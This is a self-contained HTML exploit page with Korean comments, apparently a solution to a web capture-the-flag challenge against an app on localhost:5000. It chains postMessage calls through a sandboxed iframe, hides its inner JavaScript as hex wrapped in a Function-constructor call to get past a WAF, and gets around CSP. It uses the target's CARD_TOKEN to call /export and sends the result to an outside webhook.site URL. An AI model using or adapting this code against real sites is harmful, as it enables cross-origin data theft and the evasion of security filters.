<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Ultimate Relay Exploit</title>
</head>
<body>
    <script>
        // 1. 웹훅 설정
        const W = "https://webhook.site/29d1e2bb-f7e3-4dbe-a679-f520fe066a12"; 
        
        // 봇 접속 확인용 핑
        new Image().src = W + "?step=1_bot_arrived";

        // 2. CSP 우회: 타겟 프레임이 훔쳐서 던져주는 데이터를 여기서 받음
        window.addEventListener("message", function(e) {
            if (e.data && e.data.type === "exfil") {
                // 데이터를 받으면 내 페이지에서 안전하게 웹훅으로 전송!
                const payloadStr = typeof e.data.payload === 'object' ? JSON.stringify(e.data.payload) : e.data.payload;
                new Image().src = W + "?step=3_exfil_success&data=" + encodeURIComponent(payloadStr);
            }
        });

        // 3. 타겟 안에서 실행될 순수 로직 (CSP 때문에 외부 통신 불가)
        const innerCode = `
            try {
                fetch('/export', {
                    method: 'POST',
                    headers: { 
                        'X-Card-Token': typeof CARD_TOKEN !== 'undefined' ? CARD_TOKEN : 'NOT_FOUND', 
                        'Content-Type': 'application/javascript' 
                    },
                    body: '1'
                })
                .then(r => r.text())
                .then(data => top.postMessage({type: 'exfil', payload: data}, '*'))
                .catch(err => top.postMessage({type: 'exfil', payload: 'FetchError: ' + err.message}, '*'));
            } catch(e) {
                top.postMessage({type: 'exfil', payload: 'EvalError: ' + e.message}, '*');
            }
        `;

        // 4. WAF 우회: innerCode를 마침표, 쉼표 없는 완벽한 Hex 문자열로 100% 변환
        let hexEncoded = "";
        for(let i=0; i<innerCode.length; i++) {
            let hex = innerCode.charCodeAt(i).toString(16);
            hexEncoded += "%" + hex.padStart(2, '0');
        }

        // 마침표(.) 쉼표(,) eval, constructor 단어 배제 래퍼
        const PAYLOAD = '[]["fill"]["con"+"structor"](unescape("' + hexEncoded + '"))()';

        // 5. 프레임 로딩 대기 후 샌드박스로 발사 명령
        window.onload = () => {
            setTimeout(() => {
                const sandbox = document.getElementById("sandbox");
                sandbox.contentWindow.postMessage({cmd: "attack", payload: PAYLOAD}, "*");
                new Image().src = W + "?step=2_attack_initiated";
            }, 1500); // 1.5초 대기
        };
    </script>

    <iframe name="preview" src="http://localhost:5000/preview" style="width:100px; height:100px; opacity:0.1;"></iframe>

    <iframe id="sandbox" sandbox="allow-scripts" srcdoc="
        <script>
            window.addEventListener('message', (e) => {
                if(e.data && e.data.cmd === 'attack') {
                    // null origin 상태에서 타겟(frames[0])으로 postMessage 발사
                    parent.frames[0].postMessage(e.data.payload, '*');
                }
            });
        </script>
    " style="display:none;"></iframe>
</body>
</html>
